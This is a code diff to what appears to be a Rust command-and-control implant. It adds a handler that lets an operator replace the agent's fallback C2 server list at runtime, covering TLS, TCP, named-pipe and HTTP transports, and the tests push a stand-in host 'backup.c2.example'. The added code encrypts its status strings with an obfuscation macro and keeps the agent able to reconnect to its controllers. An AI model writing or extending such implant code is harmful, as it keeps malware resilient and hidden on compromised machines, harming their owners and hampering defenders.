@@ -43,6 +43,31 @@ pub fn handle_fallback_config() -> DispatchResult {
     DispatchResult::Reply(info, String::new(), 0, AgentAction::None)
 }
 
+/// fallback:push|<json> - replace the fallback endpoint list at runtime.
+///
+/// The JSON is the shared positional FallbackConfig encoding
+/// (src/common.rs): [endpoints, strategy, dead_time_secs] where each
+/// endpoint is [host, port, transport] with optional trailing
+/// [profile, proxy, priority, weight, max_failures]; transport tags:
+/// 0=tls, 1=tcp_plain, 2=named_pipe, 3=http, 4=https; strategy tags:
+/// 0=round_robin, 1=random, 2=priority, 3=failover.
+/// Applied by the run loop on the next reconnect (AgentAction::UpdateFallback).
+pub fn handle_fallback_push(args: &str) -> DispatchResult {
+    match serde_json::from_str::<crate::common::FallbackConfig>(args.trim()) {
+        Ok(fb) if !fb.endpoints.is_empty() => {
+            let n = fb.endpoints.len();
+            let msg = format!("{} ({} {})",
+                aes_str!("Fallback Updated - active on next reconnect"), n, aes_str!("endpoints"));
+            DispatchResult::Reply(msg, String::new(), 0, AgentAction::UpdateFallback(fb))
+        }
+        Ok(_) => DispatchResult::Reply(String::new(),
+            aes_str!("Fallback Parse Error: endpoints must be non-empty (refusing to lock agent onto primary only)"),
+            1, AgentAction::None),
+        Err(e) => DispatchResult::Reply(String::new(),
+            format!("{}: {}", aes_str!("Fallback Parse Error"), e), 1, AgentAction::None),
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -91,6 +116,32 @@ mod tests {
         match handle_beacon_mode(false) {
             DispatchResult::Reply(_, _, 0, AgentAction::SetMode(false)) => {}
             _ => panic!("Expected SetMode(false)"),
+        }
+    }
+
+    #[test]
+    fn fallback_push_valid_json() {
+        match handle_fallback_push(r#"[[["backup.c2.example",8443,0]],2,300]"#) {
+            DispatchResult::Reply(_, err, 0, AgentAction::UpdateFallback(fb)) => {
+                assert!(err.is_empty());
+                assert_eq!(fb.endpoints.len(), 1);
+                assert_eq!(fb.endpoints[0].host, "backup.c2.example");
+                assert_eq!(fb.endpoints[0].port, 8443);
+                assert_eq!(fb.dead_time_secs, 300);
+            }
+            _ => panic!("Expected UpdateFallback"),
+        }
+    }
+
+    #[test]
+    fn fallback_push_rejects_bad_json_and_empty_list() {
+        match handle_fallback_push("not json") {
+            DispatchResult::Reply(_, err, 1, AgentAction::None) => assert!(!err.is_empty()),
+            _ => panic!("Expected parse error"),
+        }
+        match handle_fallback_push("[[],2,300]") {
+            DispatchResult::Reply(_, err, 1, AgentAction::None) => assert!(!err.is_empty()),
+            _ => panic!("Expected empty-endpoints error"),
         }
     }
 }
